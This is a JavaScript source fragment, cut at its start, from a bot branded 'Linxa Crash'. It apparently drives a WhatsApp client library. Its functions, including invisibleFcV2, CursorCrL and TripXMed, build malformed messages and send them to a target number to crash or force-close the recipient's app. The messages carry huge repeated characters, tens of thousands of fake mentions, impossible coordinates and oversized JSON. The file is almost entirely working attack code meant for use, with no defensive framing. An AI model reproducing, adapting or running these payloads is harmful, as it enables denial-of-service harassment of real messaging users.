console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [target],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "mengjawa" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}

async function invisibleFcV2(target) {
    console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
let OtaxSukaBokong = JSON.stringify({
  status: true,
  criador: "OtaxCrash",
  timestamp: Date.now(),
  noise: "}".repeat(1000000), // 1 juta karakter
  resultado: {
    type: "md",
    dummyRepeat: Array(100).fill({
      id: "OtaxBot" + Math.random(),
      message: "\u200f".repeat(5000),
      crash: {
        deepLevel: {
          level1: {
            level2: {
              level3: {
                level4: {
                  level5: {
                    loop: Array(50).fill("🪷".repeat(500))
                  }
                }
              }
            }
          }
        }
      }
    }),
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: -98411,
      _maxListeners: Infinity,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: new Array(500).fill([99, 99, 99]),
        browser: new Array(100).fill(["Chrome", "Linux"]),
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 100,
        keepAliveIntervalMs: 10,
        logger: {
          logs: Array(1000).fill("OtaxPenggodaJanda")
        },
        spam: Array(1000).fill("🪺").join(""),
        auth: { Object: "authData" },
        crashTrigger: {
          nullField: null,
          undefinedField: undefined,
          boolSwitch: [true, false, false, true, null],
          crazyArray: new Array(10000).fill(Math.random())
        },
        mobile: true
      }
    }
  }  
});
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                        degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                    name: "ꦾ".repeat(10000),
                    address: "\u200f",
                  nativeFlowMessage: {
              messageParamsJson: "}".repeat(100000),
              },
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 40000 }, () =>
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

    await Aii.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: OtaxSukaBokong,
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: target
    });
}

async function GhostSqL(target) {

  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: Aii.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await Aii.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function resd(target, mention) {
    let biji = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "⭑‌𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000), // trigger (you can replace it with 0002)
                        version: 3
                    }
                }
            }
        }
    }, {
        // ❗ Essential properties for messages to be sent
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    });

    await Aii.relayMessage("status@broadcast", biji.message, {
        messageId: biji.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    // ❗ If the z parameter is true, a follow up message will be sent. but i don't recommend it.
    if (mention) {
        await Aii.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: biji.key,
                        type: 25, // enum 25 > STATUS_MENTION_MESSAGE
                    },
                },
            },
        }, {});
    }
}

async function SaturnCursorV1(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: '𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸 ?' + '\n'.repeat(5000),
                  hasMediaAttachment: false
                },
                body: { text: "\u0005" },
                footer: { text: "\u0005" }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    interactiveMessage: {
                      contextInfo: {},
                      body: {
                        text: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸 ?"
                      },
                      nativeFlowMessage: {
                        buttons: [
                          {
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({
                              data: "\u00075".repeat(1000),
                              status: "\u0005".repeat(1000)
                            })
                          }
                        ]
                      }
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await Aii.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function CursorCrL(Aii, target) {
const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸\n' + 'ꦾ'.repeat(50000)
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸" + "ꦽ".repeat(40000)
                },
                footer: {
                  text: "null"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await Aii.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function LocationFlowX2(target) {
try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: " ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Aii.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function OneMsgFlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗫𝘆𝗿𝗼𝗼 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗜𝘀 𝗛𝗮𝗿𝗲🩸",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

  await Aii.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function TripXMed(target) {
  for (let r = 0; r < 1; r++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
           messageContextInfo: {
            deviceListMetadata: {}, 
            deviceListMetaeataVersion: 2,
            messageSecret: crypto.randomBytes(25), 
            supportPayload: {
            version: 2,
            is_ai_message: true, 
            should_show_system_message: true, 
            ticket_id: crypto.randomBytes(2008)
            }
           }, 
            interactiveMessage: {
              header: {
                text: '</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>',
                locationMessage: {
                  degreesLatitude: 999999999,
                  degreesLongitude: -999999999,
                  name: '{'.repeat(100000),
                  address: '{'.repeat(100000)
                }
              },
              body: { text: "" },
              footer: { text: "" },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(30000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "vjSnpPeWQ7ly+37/XaC1e4XwwiPHUaIvPWyf3/Pqlbw=",
                fileLength: "3070510",
                seconds: 16,
                mediaKey: "GE3pFBmSXUH2lWGJKvJYY2U5BIgZyVKQF6JJyzaZNWI=",
                height: 864,
                width: 480,
                fileEncSha256: "n6q6pu9BeJ0dDkSRpKa8y2OtVbZ2bw6pLfKzoyFB/Yc=",
                directPath: "/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1749720441",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }
            }
          }
        }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await Aii.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      console.log(`Forclose to ${target}`);
    } catch (err) {
      console.error("❌ Gagal forclose:", err);
    }
  }
}
// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses Connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red(`\n
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
    console.log(chalk.bold.red("𝐋𝐢𝐧𝐱𝐚 𝐂𝐫𝐚𝐬𝐡"));
    console.log(chalk.bold.white("Developer:") + chalk.bold.blue("𝐗𝐲𝐚𝐧𝐧"));
    console.log(chalk.bold.white("Version:") + chalk.bold.red("1.0\n\n"));
    console.log(chalk.bold.blue("©𝐋𝐲𝐧𝐱𝐚 𝐂𝐫𝐚𝐬𝐡. . ."));
})();